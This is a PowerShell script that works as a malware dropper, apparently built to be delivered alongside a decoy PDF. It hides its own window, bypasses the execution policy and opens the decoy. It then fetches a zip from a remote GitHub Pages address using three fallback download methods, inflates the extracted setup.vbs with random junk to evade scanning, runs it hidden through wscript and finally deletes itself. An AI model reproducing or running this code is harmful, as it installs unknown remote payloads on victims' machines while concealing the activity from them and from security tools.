<#  #>

# ============================================================
# Script starts here
# ============================================================
$ShowWindow = $1

if (-not $ShowWindow) {
    # Hide this window if not already hidden
    if ($env:__PS_HIDDEN_LAUNCH -ne "1") {
        $scriptPath = $MyInvocation.MyCommand.Path
        $env:__PS_HIDDEN_LAUNCH = "1"
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
        exit
    }
}

# ------------------------------------------------------------
# Logging (simple)
# ------------------------------------------------------------
$logPath = Join-Path $env:TEMP "ps1_debug.log"
function Write-Log {
    param($msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logPath -Value "$timestamp - $msg"
}
Write-Log "================== SCRIPT START =================="

# ------------------------------------------------------------
# Main code
# ------------------------------------------------------------
$urls = @("https://gghuub321.github.io/DogFile/QuickAny.ps1")
Write-Log "URL: $urls"

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
$prePath = Join-Path $scriptDir "ali.pdf"
if (Test-Path $prePath) {
    Write-Log "ali.pdf found, opening..."
    Start-Process -FilePath $prePath -Wait -WindowStyle Hidden
} else {
    Write-Log "ali.pdf NOT found"
}

$tempDir = [System.IO.Path]::GetTempPath()

function Get-RandomString {
    param($length)
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    -join ((1..$length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
}

function Find-SetupVBS {
    param($folder)
    Get-ChildItem -Path $folder -Recurse -Filter "setup.vbs" -ErrorAction SilentlyContinue |
        Select-Object -First 1 -ExpandProperty FullName
}

foreach ($url in $urls) {
    Write-Log "Processing URL: $url"
    $randName = Get-RandomString -length 12
    $zipPath = Join-Path $tempDir "download_$randName.zip"
    $extractDir = Join-Path $tempDir "setup_$randName"
    $ts = "?t=" + [int]((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalMilliseconds)
    $fullUrl = $url + $ts
    Write-Log "Full URL: $fullUrl"
    $downloadSuccess = $false

    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $fullUrl -OutFile $zipPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -ErrorAction Stop
        $downloadSuccess = $true
        Write-Log "Download OK (WebRequest)"
    } catch {
        Write-Log "WebRequest failed: $_"
        try {
            Start-BitsTransfer -Source $fullUrl -Destination $zipPath -Priority Low -ErrorAction Stop
            $downloadSuccess = $true
            Write-Log "Download OK (BITS)"
        } catch {
            Write-Log "BITS failed: $_"
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                $wc.DownloadFile($fullUrl, $zipPath)
                $downloadSuccess = $true
                Write-Log "Download OK (WebClient)"
            } catch {
                Write-Log "WebClient failed: $_"
            }
        }
    }

    if (-not $downloadSuccess) {
        Write-Log "ALL download methods failed"
        continue
    }

    if ((Get-Item $zipPath).Length -lt 1000) {
        Write-Log "ZIP too small, deleting"
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        continue
    }

    try {
        Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force -ErrorAction Stop
        Write-Log "Extraction OK"
    } catch {
        Write-Log "Extraction failed: $_"
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        continue
    }

    $vbsPath = Find-SetupVBS -folder $extractDir
    if ($vbsPath) {
        Write-Log "Found setup.vbs: $vbsPath"
        # Always add junk to VBS (100‑700 KB)
        $junkSize = Get-Random -Minimum 102400 -Maximum 716800
        $junk = Get-RandomString -length $junkSize
        Add-Content -Path $vbsPath -Value ("'" + $junk)
        Write-Log "Added junk to VBS"

        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
        Write-Log "Launched VBS"
    } else {
        Write-Log "setup.vbs NOT found in extracted folder"
    }

    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}

# ============================================================
# Open URL after VBS (optional)
# ============================================================
$OpenUrlAfterVbs = $0   # "1" or "0"
$UrlAfterVbs = "https://cloudnesto.com/SoftwareEXE"

if ($OpenUrlAfterVbs -eq "1" -and $UrlAfterVbs) {
    Write-Log "Opening URL after VBS: $UrlAfterVbs"
    Start-Process $UrlAfterVbs
} else {
    Write-Log "URL opening after VBS is disabled or URL empty"
}

# ============================================================
# Self‑destruct (always)
# ============================================================
$selfPath = $MyInvocation.MyCommand.Path
Start-Process -FilePath "powershell.exe" -ArgumentList "-Command `"Start-Sleep -Seconds 2; Remove-Item -Path '$selfPath' -Force`"" -WindowStyle Hidden
Write-Log "Script finished, self‑destruct scheduled"
Write-Log "================== SCRIPT END =================="
